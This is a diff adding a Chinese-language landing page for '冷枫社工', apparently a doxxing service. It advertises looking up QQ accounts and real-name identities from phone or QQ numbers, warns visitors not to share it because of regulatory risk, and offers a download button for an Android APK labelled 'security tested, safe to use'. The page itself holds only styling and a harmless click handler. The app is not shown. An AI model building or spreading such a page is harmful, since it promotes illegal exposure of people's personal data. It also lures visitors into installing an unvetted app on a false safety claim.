@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>冷枫社工</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Microsoft YaHei', sans-serif;
+        }
+        
+        body {
+            background-color: #f5f7fa;
+            color: #333;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* 顶部导航样式 */
+        .header {
+            background-color: #fff;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
+            padding: 15px 0;
+        }
+        
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+        
+        .logo-icon {
+            color: #2c5aa0;
+            font-size: 28px;
+            margin-right: 12px;
+        }
+        
+        .logo-text {
+            font-size: 22px;
+            font-weight: 600;
+            color: #2c5aa0;
+        }
+        
+        /* 主内容区域 */
+        .main-content {
+            margin-top: 30px;
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 30px;
+        }
+        
+        /* 简介区域 */
+        .intro-section {
+            background-color: #fff;
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 3px 15px rgba(0, 0, 0, 0.05);
+        }
+        
+        .section-title {
+            color: #2c5aa0;
+            font-size: 24px;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #eaeff5;
+        }
+        
+        .intro-content {
+            color: #555;
+            font-size: 16px;
+            line-height: 1.8;
+            min-height: 200px;
+            background-color: #f9fafc;
+            padding: 20px;
+            border-radius: 5px;
+            border: 1px dashed #d1d9e6;
+        }
+        
+        /* 查询区域 */
+        .query-section {
+            background-color: #fff;
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 3px 15px rgba(0, 0, 0, 0.05);
+            text-align: center;
+        }
+        
+        .download-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 30px 20px;
+        }
+        
+        .download-icon {
+            font-size: 60px;
+            color: #2c5aa0;
+            margin-bottom: 20px;
+        }
+        
+        .download-btn {
+            background-color: #2c5aa0;
+            color: white;
+            border: none;
+            padding: 16px 40px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 20px;
+            text-decoration: none;
+        }
+        
+        .download-btn:hover {
+            background-color: #1e4278;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(44, 90, 160, 0.2);
+        }
+        
+        .download-btn i {
+            margin-right: 10px;
+            font-size: 20px;
+        }
+        
+        .download-info {
+            margin-top: 25px;
+            color: #666;
+            font-size: 14px;
+            max-width: 500px;
+        }
+        
+        /* 底部信息 */
+        .footer {
+            margin-top: 40px;
+            padding: 20px 0;
+            text-align: center;
+            color: #777;
+            font-size: 14px;
+            border-top: 1px solid #eaeff5;
+        }
+        
+        /* 响应式设计 */
+        @media (min-width: 768px) {
+            .main-content {
+                grid-template-columns: 1fr 1fr;
+            }
+            
+            .intro-section, .query-section {
+                height: fit-content;
+            }
+        }
+        
+        @media (max-width: 767px) {
+            .header-content {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .logo {
+                margin-bottom: 15px;
+            }
+            
+            .intro-section, .query-section {
+                padding: 20px;
+            }
+            
+            .download-btn {
+                padding: 14px 30px;
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- 顶部导航 -->
+    <div class="header">
+        <div class="container header-content">
+            <div class="logo">
+                <i class="fas fa-search logo-icon"></i>
+                <div class="logo-text">冷枫社工</div>
+            </div>
+            <div class="company-name">冷枫社工数据服务部</div>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="main-content">
+            <!-- 简介区域 -->
+            <section class="intro-section">
+                <h2 class="section-title">系统简介</h2>
+                <div class="intro-content">
+                    首先呢，我们这款软件不要有任何传播，自己用就行了，因为市场监管程度大，风险也极高，其次呢，该软件支持手机号查询QQ号，也支持QQ号查实名，包括手机号查实名，元旦节刚过，给大家个福利，每天可以免费查询一次哦，自己用就行了，不要发给别人，后续会添加更多查询功能的，请敬请期待！
+                    <!-- 用户可以在这里填写自己的简介内容 -->
+                    <!-- 这个区域的内容可以根据需要替换 -->
+                </div>
+            </section>
+            
+            <!-- 查询区域 -->
+            <section class="query-section">
+                <h2 class="section-title">冷枫社工自助查询</h2>
+                <div class="download-container">
+                    <i class="fas fa-cloud-download-alt download-icon"></i>
+                    <p style="margin-bottom: 15px; color: #444; font-size: 16px;">
+                        请下载并安装自助查询客户端软件，以便访问数据查询系统。
+                    </p>
+                    <a href="1.apk" download="自助查询软件.apk" class="download-btn">
+                        <i class="fas fa-download"></i> 下载查询软件
+                    </a>
+                    
+                    <div class="download-info">
+                        <p><i class="fas fa-info-circle"></i> 软件版本：v1.0</p>
+                        <p><i class="fas fa-file-archive"></i> 文件大小：约 4.7MB</p>
+                        <p><i class="fas fa-shield-alt"></i> 安全提示：本软件经过安全检测，可放心使用</p>
+                    </div>
+                </div>
+            </section>
+        </div>
+        
+        <!-- 底部信息 -->
+        <div class="footer">
+            <p>© 2026 查询系统 | 数据服务部提供技术支持</p>
+            <p style="margin-top: 8px; font-size: 13px;">仅供被分享使用，未经授权不得外传</p>
+        </div>
+    </div>
+
+    <script>
+        // 下载按钮点击处理
+        document.querySelector('.download-btn').addEventListener('click', function(e) {
+            // 添加简单的点击反馈
+            this.style.transform = 'scale(0.98)';
+            setTimeout(() => {
+                this.style.transform = '';
+            }, 200);
+            
+            // 这里可以添加下载统计或其他逻辑
+            console.log('开始下载自助查询软件...');
+        });
+        
+        // 模拟简介区域可编辑（实际使用时可以移除，让用户直接修改HTML）
+        const introContent = document.querySelector('.intro-content');
+        introContent.addEventListener('click', function() {
+            console.log('简介区域 - 用户可在此处填写内容');
+            console.log('要修改简介，请直接编辑HTML文件中class="intro-content"的div内的内容');
+        });
+    </script>
+</body>
+</html>
